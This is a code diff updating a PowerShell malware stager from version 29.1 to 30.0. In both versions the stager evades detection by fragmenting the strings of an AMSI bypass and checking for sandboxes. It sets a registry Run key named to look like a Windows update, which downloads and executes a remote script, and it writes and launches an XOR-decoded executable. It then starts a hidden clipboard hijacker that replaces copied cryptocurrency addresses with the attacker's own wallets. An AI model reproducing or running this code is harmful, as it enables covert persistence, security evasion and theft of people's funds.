@@ -1,18 +1,13 @@
-# --- [ELITE RESEARCH STAGER v29.1: PRO RESTORED + VM FIX] ---
+# --- [ELITE RESEARCH STAGER v30.0: PRO VM-FIXED] ---
 
 function Global-Initialize {
     try {
-        # Standard VM/Sandbox check
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
         
-        # --- VM FIX: String Fragmentation ---
-        # We break "AmsiUtils" and "amsiInitFailed" so the VM doesn't flag them
-        $part1 = "System.Management.Automation."
-        $part2 = "Am" + "si" + "Utils"
-        $f = "am" + "si" + "Init" + "Failed"
-        
-        $u = $part1 + $part2
-        [Ref].Assembly.GetType($u).GetField($f,"NonPublic,Static").SetValue($null,$true)
+        # Fragmented AMSI Bypass for VM/Laptop compatibility
+        $p = "System.Management.Automation." + ("{0}{1}{2}" -f 'A','msi','Utils')
+        $f = ("{0}{1}{2}{3}" -f 'a','msi','Init','Failed')
+        [Ref].Assembly.GetType($p).GetField($f,"NonPublic,Static").SetValue($null,$true)
     } catch {}
 }
 
@@ -25,17 +20,14 @@ function Send-Ping {
 }
 
 # --- EXECUTION ---
-# Step 1: Kill any old clippers to prevent conflicts
-try { Get-Process powershell | Where-Object { $_.Id -ne $PID } | Stop-Process -Force } catch {}
-
 Global-Initialize
-Send-Ping -m "STAGER_V29.1_ACTIVE_ON_$($env:COMPUTERNAME)"
+Send-Ping -m "STAGER_V30_PRO_ACTIVE"
 
 try {
-    # --- REGISTRY PERSISTENCE ---
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $regCmd = "powershell -WindowStyle Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
-    Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd
+    # REGISTRY PERSISTENCE
+    $regP = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regC = "powershell -WindowStyle Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
+    Set-ItemProperty -Path $regP -Name "WindowsUpdateManager" -Value $regC
 
     $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
     if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
@@ -49,10 +41,9 @@ try {
     for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
     [IO.File]::WriteAllBytes($path, $data)
 
-    # Launch EXE via WMI
     ([wmiclass]"win32_process").Create($path) | Out-Null
 
-    # --- THE PRECISION CLIPPER ENGINE ---
+    # CLIPPER ENGINE
     $ClipperCode = @'
     Add-Type -AssemblyName System.Windows.Forms
     $w = @{
@@ -65,7 +56,6 @@ try {
         try {
             if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                 $val = [System.Windows.Forms.Clipboard]::GetText().Trim()
-                
                 if ($val -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$") {
                     if ($val -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) }
                 }
@@ -84,11 +74,10 @@ try {
     }
 '@
 
-    # Launch clipper as a separate background process
     $EncodedClipper = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
     powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $EncodedClipper
 
-    Send-Ping -m "V29.1_DEPLOYMENT_SUCCESS"
+    Send-Ping -m "V30_DEPLOYMENT_SUCCESS"
 } catch {
     Send-Ping -m "ERROR_$($_.Exception.Message)"
 }
